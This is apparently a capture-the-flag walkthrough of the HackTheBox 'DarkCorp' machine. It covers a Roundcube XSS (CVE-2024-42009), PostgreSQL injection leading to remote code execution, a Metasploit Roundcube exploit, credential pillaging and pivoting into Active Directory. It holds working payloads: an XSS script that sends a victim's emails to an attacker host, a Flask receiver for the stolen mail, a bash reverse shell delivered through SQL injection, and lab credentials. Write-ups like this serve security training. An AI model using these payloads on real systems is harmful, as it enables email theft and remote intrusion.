![[Pasted_image_20251027085104.png]]

Let's do this 🧑‍💻

![[Pasted_image_20251027085330.png]]


# Recon

## Port Scan

```bash
 sudo nmap -Pn  -sCV -oN dark-corp-port-scan 10.10.11.54
[sudo] password for darklight:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 08:46 EAT
Nmap scan report for 10.10.11.54
Host is up (0.31s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.95 seconds
```

We just have two port open.

### HTTP service

Visiting the site i get this.
![[Pasted_image_20251027090208.png]]

Let's add **`drip.htb`** to our hosts file.

```bash
echo '10.10.11.54 drip.htb' | sudo tee -a /etc/hosts
```

We have a web application possibly for email management. 

![[Pasted_image_20251027093126.png]]


We also have a contact form at http://drip.htb/index#contact

Inserting some data and hitting send we get a message `Message sent successfully`

![[Pasted_image_20251027093432.png]]

Looking at the request i get this.

```
POST /contact HTTP/1.1
Host: drip.htb
Content-Length: 92
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://drip.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://drip.htb/index
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

name=doe&email=doe%40drip.htb&message=hello+there&content=text&recipient=support%40drip.htb
```

We are sending our emails to `support@drip.htb`

Registered for an account successfully as user `doe`, trying to login i get this:

![[Pasted_image_20251027094143.png]]

Lets add it to our hosts file.

After logging we have this and one email from `no-reply@drip.htb`

![[Pasted_image_20251027094603.png]]

Checking the mail header i get this 

![[Pasted_image_20251027095651.png]]

we have an additional host `drip.darkcorp.htb`. Tried adding it to my hosts file at the same entry as `drip.htb` and `mail.drip.htb` and see if i could get access to it 

I get redirected to http://drip.htb/index maybe its an AD domain.

Decided to remove it from the hosts file.

Back to the contact form i decided to change the recipient to point to our email address to see is there is any other information added to mail apart from our message

```
name=doe&email=doe%40gmail.com&message=hello+there&content=text&recipient=doe%40drip.htb
```

![[Pasted_image_20251027104849.png]]

We get another mail address for the security engineer, `bcase@drip.htb` nothing else seemed interesting


Looking at about i get this 

![[Pasted_image_20251027101120.png]]

We get the tech we are using and its version and also installed plugins and their versions also.

Looking for known exploits i get this https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/

#### CVE-2024-42009

It is a XSS exploit that allows an attacker to steal emails, contacts, and send emails from a victim's account by simply having the victim view a malicious email.

We are also provided with the payload:

```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar">
  Foo
</body>
```

To test it i created another account as user **john** The i will send an email to **doe** with the payload.

At first the payload was not being rendered, it appeared as plain text, decided to capture the sent request with burp and inspect if there is any other parameters.


```
POST /?_task=mail&_unlock=loading1761551776477&_framed=1 HTTP/1.1
Host: mail.drip.htb
Content-Length: 512
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://mail.drip.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mail.drip.htb/?_task=mail&_action=compose&_id=7791402768ff2551e46d1
Accept-Encoding: gzip, deflate, br
Cookie: roundcube_sessid=3k0ru3ostqbt8ut51hkr1g5bks; roundcube_sessauth=xvN3NSRmTV7uxK3z9DEgEQQBdq-1761551700
Connection: keep-alive

_token=H0Tb00BrIpIuSzWBRO4Yv6dEYfoeeWoS&_task=mail&_action=send&_id=7791402768ff2551e46d1&_attachments=&_from=5&_to=john%40drip.htb%2C&_cc=&_bcc=&_replyto=&_followupto=&_subject=testing+payload&_draft_saveid=&_draft=&_is_html=0&_framed=1&_message=%3Cbody+title%3D%22bgcolor%3Dfoo%22+name%3D%22bar+style%3Danimation-name%3Aprogress-bar-stripes+onanimationstart%3Dalert%28origin%29+foo%3Dbar%22%3E%0D%0A%C2%A0%C2%A0Foo%0D%0A%3C%2Fbody%3E&editorSelector=plain&_mdn=&_dsn=&_keepformatting=&_priority=0&_store_target=
```


`_is_html=0` is set to false tried modifying it to `_is_html=1`

With that our html is render but am not getting any alert popup

Decide to send the payload using the contact form since we can send emails using it.

```
name=doe&email=doe%40drip.htb&message=%3Cbody+title%3D%22bgcolor%3Dfoo%22+name%3D%22bar+style%3Danimation-name%3Aprogress-bar-stripes+onanimationstart%3Dalert%28origin%29+foo%3Dbar%22%3E%0D%0A%C2%A0%C2%A0Foo%0D%0A%3C%2Fbody%3E&content=html&recipient=doe%40drip.htb
```

on the `content` field i changed it from `text` to `html`.

And finally we get a popup when viewing the mail.

![[Pasted_image_20251027111811.png]]

![[Pasted_image_20251027112159.png]]


With that we can actually read email for users such as `bcase@drip.htb` if we construct our payload right.

Instead of using `alert(origin)` in the payload we could replace it with `eval(atob('BASE64_PAYLOAD'))`

So we have something like 

```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=eval(atob('BASE64_PAYLOAD')) foo=bar">
  Foo
</body>
```

First we need to identify how the URL is constructed for reading individual mails and here is what i got for that,  `/?_task=mail&_action=show&_uid=10&_mbox=INBOX&_extwin=1` where the `uid` is the id of the mail.

```js
for (let i = 1; i <= 15; i++) {
        fetch(`http://mail.drip.htb/?_task=mail&_action=show&_uid=${i}&_mbox=INBOX&_extwin=1`)
                .then((resp) => resp.text())
                .then((text) => fetch(`http://10.10.16.41:8000/?id=${i}&exfil=` + btoa(text))
        )
}
```

Base64 encode it

```bash
cat payload.js | base64 -w 0
Zm9yIChsZXQgaSA9IDE7IGkgPD0gNTA7IGkrKykgewogICAgICAgIGZldGNoKGBodHRwOi8vbWFpbC5kcmlwLmh0Yi8/X3Rhc2s9bWFpbCZfYWN0aW9uPXNob3cmX3VpZD0ke2l9Jl9tYm94PUlOQk9YJl9leHR3aW49MWAsIHttb2RlOiAnbm8tY29ycyd9KQogICAgICAgICAgICAgICAgLnRoZW4oKHJlc3ApID0+IHJlc3AudGV4dCgpKQogICAgICAgICAgICAgICAgLnRoZW4oKHRleHQpID0+IGZldGNoKGBodHRwOi8vMTAuMTAuMTYuNDE6ODAwMC8/aWQ9JHtpfSZleGZpbD1gICsgYnRvYSh0ZXh0KSkKICAgICAgICApCn0K
```

Then we update the payload to 

```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=eval(atob('Zm9yIChsZXQgaSA9IDE7IGkgPD0gNTA7IGkrKykgewogICAgICAgIGZldGNoKGBodHRwOi8vbWFpbC5kcmlwLmh0Yi8/X3Rhc2s9bWFpbCZfYWN0aW9uPXNob3cmX3VpZD0ke2l9Jl9tYm94PUlOQk9YJl9leHR3aW49MWAsIHttb2RlOiAnbm8tY29ycyd9KQogICAgICAgICAgICAgICAgLnRoZW4oKHJlc3ApID0+IHJlc3AudGV4dCgpKQogICAgICAgICAgICAgICAgLnRoZW4oKHRleHQpID0+IGZldGNoKGBodHRwOi8vMTAuMTAuMTYuNDE6ODAwMC8/aWQ9JHtpfSZleGZpbD1gICsgYnRvYSh0ZXh0KSkKICAgICAgICApCn0K')) foo=bar">
  Foo
</body>
```

repeat the same process of sending the email and modifying the `recipient`  to whoever you want to send the email to and `content` to html

we get the messages is base64 format 

![[Pasted_image_20251027122323.png]]

We could use this simple script to receive the base64 data, decode it and save it to .html files which we will view using the browser

```python
from flask import Flask, request, send_file
import base64
import logging

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/')
def index():
    query_string = request.query_string.decode('utf-8')

    mid = None
    exfil = None

    for param in query_string.split('&'):
        if '=' in param:
            key, value = param.split('=', 1)
            if key == 'id':
                mid = value
            elif key == 'exfil':
                exfil = value

    decoded = base64.b64decode(exfil)
    if not b'SERVER ERROR!' in decoded:
        fn = f'bcase_{mid}.html'
        with open(fn, 'wb') as f:
            f.write(decoded)
        print(f'Wrote email to {fn}')

    return 'Request received'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=False)
```


we get this 

![[Pasted_image_20251027125817.png]]

a subdomain `dev-a3f1-01.drip.htb` and also another user `ebelford@drip.htb`

#### `http://dev-a3f1-01.drip.htb/`

we get access denied 

![[Pasted_image_20251027130127.png]]


Clicking the login button i get this 

![[Pasted_image_20251027130222.png]]


We don't have the option to create an account but we can reset the password as indicated in the mail above: "`Please note that you'll need to reset your password before logging in`" 

All we need is an email address

![[Pasted_image_20251027130506.png]]

We can request a password reset for `bcase@drip.htb` then using the XSS in roundcube, we can read mails for `bcase` including the reset password mail.

we get the email with password reset token

![[Pasted_image_20251027201949.png]]

Ad we get access to the page

![[Pasted_image_20251027202026.png]]


We have an SQLi at the search field.

![[Pasted_image_20251027202628.png]]

Based on the error message we identify the database as postgres

we can get RCE using the payload

```
'hello';DO $$ DECLARE cmd text; BEGIN cmd := CHR(67) || 'OPY (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/10.10.16.41/1337 0>&1"'''; EXECUTE cmd; END $$;
```

check out this https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program

![[Pasted_image_20251027203504.png]]

![[Pasted_image_20251027204726.png]]


#### CVE-2025-49113

In `cvedetails` we had another CVE that allows RCE. 
https://www.cvedetails.com/vulnerability-list/vendor_id-8905/Roundcube.html

```bash
msf6 > use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Linux Dropper
    1   Linux Command


msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set TARGET 1
TARGET => 1
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > show options

Module options (exploit/multi/http/roundcube_auth_rce_cve_2025_49113):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HOST                        no        The hostname of Roundcube server
   PASSWORD                    yes       Password to login with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI of the Roundcube Application
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME                    yes       Email User to login with
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addres
                                       ses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Command



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set USERNAME doe
USERNAME => doe
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set PASSWORD doe
PASSWORD => doe
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set RHOSTS 10.10.11.54
RHOSTS => 10.10.11.54
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set LHOST tun0
LHOST => 10.10.16.41
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set VHOST mail.drip.htb
VHOST => mail.drip.htb
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > exploit
[*] Started reverse TCP handler on 10.10.16.41:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Extracted version: 10607
[+] The target appears to be vulnerable.
[*] Fetching CSRF token...
[+] Extracted token: OWG5rD6VIBbGsBmvDN0HyYbgJkyekaHk
[*] Attempting login...
[+] Login successful.
[*] Preparing payload...
[+] Payload successfully generated and serialized.
[*] Uploading malicious payload...
[+] Exploit attempt complete. Check for session.
[*] Command shell session 1 opened (10.10.16.41:4444 -> 10.10.11.54:64730) at 2025-10-27 21:04:35 +0300

whoami
www-data
shell
[*] Trying to find binary 'python' on the target machine
[-] python not found
[*] Trying to find binary 'python3' on the target machine
[*] Found python3 at /usr/bin/python3
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /usr/bin/bash


www-data@drip:/$ ls
ls
bin   etc	 initrd.img.old  lost+found  opt   run   sys  var
boot  home	 lib		 media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64		 mnt	     root  srv   usr  vmlinuz.old
www-data@drip:/$
```

We get a shell as www-data

# Lateral Movement

Running linpeas in the www-data terminal i get a bunch of information

## Pillaging

```
-rw-r--r-- 1 root root 796 Jan 15  2025 /var/www/html/dashboard/.env
DEBUG=False
FLASK_APP=run.py
FLASK_ENV=development
ASSETS_ROOT=/static/assets
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432
SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
[SNIP]

Contents of /etc/hosts:
  127.0.0.1	localhost drip.htb mail.drip.htb dev-a3f1-01.drip.htb
  ::1     localhost ip6-localhost ip6-loopback
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters
  172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
  172.16.20.3 drip.darkcorp.htb
```

verifying the findings, checking the network interfaces 

```bash
www-data@drip:/tmp$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:84:03:02 brd ff:ff:ff:ff:ff:ff
    inet 172.16.20.3/24 brd 172.16.20.255 scope global eth0
       valid_lft forever preferred_lft forever
www-data@drip:/tmp$
```

from the hosts file we know `172.16.20.1` maps to the domain controller. Since we don't have nmap installed in the system we can upload a nmap binary and execute it.

```bash
www-data@drip:/tmp$ nmap -sT 172.16.20.0/24
nmap -sT 172.16.20.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2025-10-27 13:06 MDT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for DC-01 (172.16.20.1)
Host is up (0.0012s latency).
Not shown: 1144 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
443/tcp open  https
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps

Nmap scan report for 172.16.20.2
Host is up (0.0017s latency).
Not shown: 1152 closed ports
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  epmap
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap scan report for drip.darkcorp.htb (172.16.20.3)
Host is up (0.000080s latency).
Not shown: 1154 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 256 IP addresses (3 hosts up) scanned in 9.16 seconds
www-data@drip:/tmp$
```

We identify one more host.

Further enumeration is done from postgres shell.

users that can login.

```bash
postgres@drip:/var/lib/postgresql/15/main$ cat /etc/passwd | grep sh$
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
bcase:x:1000:1000:Bryce Case Jr.,,,:/home/bcase:/bin/bash
postgres:x:102:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash
```

we can access `ebelford's` home directory but there is nothing to see.

```bash
postgres@drip:/home/ebelford$ ls -al
ls -al
total 8
drwxr-xr-x 2 ebelford ebelford 4096 Feb  5  2025 .
drwxr-xr-x 5 root     root     4096 Feb  3  2025 ..
lrwxrwxrwx 1 root     root        9 Feb  3  2025 .bash_history -> /dev/null
```

Since postgres can login as a user in the system, let's generate ssh keys that can allow us to get a much stable shell.

Generate the pub private key pair

```bash
ssh-keygen -t ed25519 -f pg
Generating public/private ed25519 key pair.
Enter passphrase for "pg" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in pg
Your public key has been saved in pg.pub
The key fingerprint is:
SHA256:fhNbwzpnqRQtpIyr0ntWmBCIB0rJ1cfVu9dhwXRk4RE darklight@ataraxia
The key's randomart image is:
+--[ED25519 256]--+
|o+oo. . ...   oE*|
|+oo .. o   .  .+o|
|..   ..   . .  ..|
|    .  o o +   o |
|     ..oS + * o .|
|      oo.  O + . |
|   .  ... B =    |
|  . ..o  o *     |
|   .o+    .      |
+----[SHA256]-----+
```

Then we need to copy the contents of `pg.pub` "public key" to `authorized_keys` in .ssh in postgres home directory 

```bash
postgres@drip:/var/lib/postgresql$ mkdir .ssh
mkdir .ssh
postgres@drip:/var/lib/postgresql$ cd .ssh
cd .ssh
postgres@drip:/var/lib/postgresql/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA945NAheNZoH21hBequJfFyJvh74CLrG4ufziZQ2jPU darklight@ataraxia' > authorized_keys
```

Then let's login using the private key 

```bash
ssh postgres@drip.htb -i pg
The authenticity of host 'drip.htb (10.10.11.54)' can't be established.
ED25519 key fingerprint is SHA256:JNw/rUlpDzlUEzvKKKFQ/M4prRH35ZhHammHWv47SkY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'drip.htb' (ED25519) to the list of known hosts.
Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
postgres@drip:~$ pwd
/var/lib/postgresql
postgres@drip:~$ssh postgres@drip.htb -i pg
The authenticity of host 'drip.htb (10.10.11.54)' can't be established.
ED25519 key fingerprint is SHA256:JNw/rUlpDzlUEzvKKKFQ/M4prRH35ZhHammHWv47SkY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'drip.htb' (ED25519) to the list of known hosts.
Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
postgres@drip:~$ pwd
/var/lib/postgresql
postgres@drip:~$
```

First thing i notice in postgres' home directory is the presence of `.gnupg` directory. 

```bash
postgres@drip:~$ ls -al
total 28
drwxr-xr-x  6 postgres postgres 4096 Oct 28 10:55 .
drwxr-xr-x 42 root     root     4096 Feb  3  2025 ..
drwxr-xr-x  3 postgres postgres 4096 Jan 10  2025 15
lrwxrwxrwx  1 root     root        9 Jan 10  2025 .bash_history -> /dev/null
drwx------  4 postgres postgres 4096 Feb  5  2025 .gnupg
-rw-------  1 postgres postgres   20 Feb  3  2025 .lesshst
drwxr-xr-x  3 postgres postgres 4096 Jan 10  2025 .local
lrwxrwxrwx  1 root     root        9 Jan 10  2025 .psql_history -> /dev/null
drwx------  2 postgres postgres 4096 Oct 28 10:56 .ssh
```


This indicates the possibility of encrypted files in the system.

Lets pillage the database and see what we can find.

![[Pasted_image_20251028201200.png]]

we have two databases of interest `roundcube` and `drimail`

in `dripmail` database

![[Pasted_image_20251028201628.png]]

we get some hashes from the `users` table and one has from the `admins` table

![[Pasted_image_20251028201717.png]]

They don't crack though.

![[Pasted_image_20251028201920.png]]

we can look at postgres log file at `/var/log/posgresql`
We have a bunch of log files.

```bash
postgres@drip:/var/log/postgresql$ ls -al
total 196
drwxrwxr-t  2 root     postgres   4096 Oct 27 22:02 .
drwxr-xr-x 14 root     root       4096 Oct 27 22:02 ..
-rw-r-----  1 postgres adm      130342 Oct 28 11:21 postgresql-15-main.log
-rw-r-----  1 postgres adm        2621 Oct 27 22:02 postgresql-15-main.log.1
-rw-r-----  1 postgres adm        1117 Jul 23 19:04 postgresql-15-main.log.2.gz
-rw-r-----  1 postgres adm        7416 Feb 11  2025 postgresql-15-main.log.3.gz
-rw-r-----  1 postgres adm        4282 Feb  3  2025 postgresql-15-main.log.4.gz
-rw-r-----  1 postgres adm        2082 Jan 26  2025 postgresql-15-main.log.5.gz
-rw-r-----  1 postgres adm        4931 Jan 20  2025 postgresql-15-main.log.6.gz
-rw-r-----  1 postgres adm        6722 Jan 13  2025 postgresql-15-main.log.7.gz
-rw-r-----  1 postgres adm        3866 Jan  5  2025 postgresql-15-main.log.8.gz
-rw-r-----  1 postgres adm        7691 Dec 30  2024 postgresql-15-main.log.9.gz
```


Performing a simple grep 

![[Pasted_image_20251028203152.png]]

But we still have .gz files we can use zcat to read the files

![[Pasted_image_20251028203356.png]]
we see an entry of updating `ebelford's` password 

The hash cracks.

![[Pasted_image_20251028203547.png]]

We can login using ssh to `drip.htb` but the user does not seem to have anything interesting 

```bash
ebelford@drip:~$ pwd
/home/ebelford
ebelford@drip:~$ groups
ebelford
ebelford@drip:~$ find / -user ebelford 2>/dev/null | grep -v '/proc\|/sys'
/dev/pts/1
/run/user/1002
/run/user/1002/pk-debconf-socket
/run/user/1002/gnupg
/run/user/1002/gnupg/S.gpg-agent
/run/user/1002/gnupg/S.gpg-agent.ssh
/run/user/1002/gnupg/S.gpg-agent.extra
/run/user/1002/gnupg/S.gpg-agent.browser
/run/user/1002/gnupg/S.dirmngr
/run/user/1002/bus
/home/ebelford
```

back in postgres shell, viewing files that postgres has access to 

```bash
postgres@drip:/var/log/postgresql$ find / -user postgres 2>/dev/null | grep -v '/proc\|/var/lib\|/sys'
/dev/shm/PostgreSQL.3030901198
/dev/shm/PostgreSQL.2924567450
/dev/pts/0
/run/user/102
/run/user/102/pk-debconf-socket
/run/user/102/gnupg
/run/user/102/gnupg/S.gpg-agent
/run/user/102/gnupg/S.gpg-agent.ssh
/run/user/102/gnupg/S.gpg-agent.extra
/run/user/102/gnupg/S.gpg-agent.browser
/run/user/102/gnupg/S.dirmngr
/run/user/102/bus
/run/postgresql
/run/postgresql/15-main.pid
/run/postgresql/.s.PGSQL.5432
/run/postgresql/.s.PGSQL.5432.lock
/etc/postgresql
/etc/postgresql/15
/etc/postgresql/15/main
/etc/postgresql/15/main/environment
/etc/postgresql/15/main/pg_hba.conf
/etc/postgresql/15/main/pg_ident.conf
/etc/postgresql/15/main/pg_ctl.conf
/etc/postgresql/15/main/conf.d
/etc/postgresql/15/main/start.conf
/etc/postgresql/15/main/postgresql.conf
/var/backups/postgres
/var/backups/postgres/dev-dripmail.old.sql.gpg
/var/log/postgresql/postgresql-15-main.log.6.gz
/var/log/postgresql/postgresql-15-main.log.9.gz
/var/log/postgresql/postgresql-15-main.log.7.gz
/var/log/postgresql/postgresql-15-main.log.5.gz
/var/log/postgresql/postgresql-15-main.log.3.gz
/var/log/postgresql/postgresql-15-main.log.1
/var/log/postgresql/postgresql-15-main.log.8.gz
/var/log/postgresql/postgresql-15-main.log
/var/log/postgresql/postgresql-15-main.log.4.gz
/var/log/postgresql/postgresql-15-main.log.2.gz
```

This `/var/backups/postgres/dev-dripmail.old.sql.gpg` looks interesting since we have identified the presence of the `.gnupg` directory in postgres' home directory. To decrypt the file run 

```bash
gpg --decrypt <filename/path>
```

we need a password so that we can be able to decrypt the file

![[Pasted_image_20251028205456.png]]

From the the .env file we identified with linpeas we had this database password `2Qa2SsBkQvsc` we could try to it, we can also look at web config files related to postgres or read code looking for any hardcoded credentials.

The password works and we get more hashes

![[Pasted_image_20251028205951.png]]

hash for `victor.r` cracks

![[Pasted_image_20251028210958.png]]

We know we that `victor.r` is not a user in the `drip.htb` host. We need to pivot so that we can have access to the other hosts from our host. We could use `ligolo` , `sshuttle` or `ssh` with `proxychains`. 
Am going to use `ssh` with `proxychains`. we just to add one option when logging in using ssh then each command we run we append the command `proxychains`

```bash
ssh postgres@drip.htb -i pg -D 9050
```

## Active Directory 

Earlier we had identified 3 hosts 

```
172.16.20.1
172.16.20.2
172.16.20.3
```

We know `172.16.20.3` is the host we were on whose FQDN is `drip.darkcorp.htb`.

```bash
┌──(darklight㉿ataraxia)-[~/…/ctf/htb/machines/darkcorp]
└─$ proxychains4 nxc smb 172.16.20.1
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.20.1:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.20.1:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.20.1:445  ...  OK
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)

┌──(darklight㉿ataraxia)-[~/…/ctf/htb/machines/darkcorp]
└─$ proxychains4 nxc smb 172.16.20.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.20.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.20.2:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.20.2:445  ...  OK
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)
```

We notice that `WEB-01` has signing set to false, this often leads to relay attacks.
Let's add the host to the host file

```bash
tail -n 3 /etc/hosts
172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
172.16.20.2 WEB-01 WEB-01.darkcorp.htb
172.16.20.3 drip drip.darkcorp.htb
```


My nmap scans returned no ports.

```bash
proxychains4 nmap -sT -Pn 172.16.20.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 08:18 EAT
Nmap scan report for WEB-01 (172.16.20.2)
Host is up.
All 1000 scanned ports on WEB-01 (172.16.20.2) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 201.40 seconds
```


I will try `sshuttle`  

```bash
sudo sshuttle -r ebelford@drip.htb 172.16.20.0/24
```

with `shuttle` am getting all ports as open 

```bash
nmap -sT -Pn 172.16.20.1
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 08:38 EAT
Nmap scan report for DC-01 (172.16.20.1)
Host is up (0.00014s latency).

PORT      STATE SERVICE
1/tcp     open  tcpmux
3/tcp     open  compressnet
4/tcp     open  unknown
6/tcp     open  unknown
7/tcp     open  echo
9/tcp     open  discard
13/tcp    open  daytime
17/tcp    open  qotd
19/tcp    open  chargen
20/tcp    open  ftp-data

[SNIP]
```

am going to use `ligolo` instead

how to set up `ligolo` for pivoting read this [[DarkZero#Pivoting]]

We identify several ports open that we hadn't identified earlier using `nmap` binary uploaded to the `drip.htb`

```bash
nmap -sT -Pn 172.16.20.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 09:13 EAT
Nmap scan report for WEB-01 (172.16.20.2)
Host is up (1.4s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
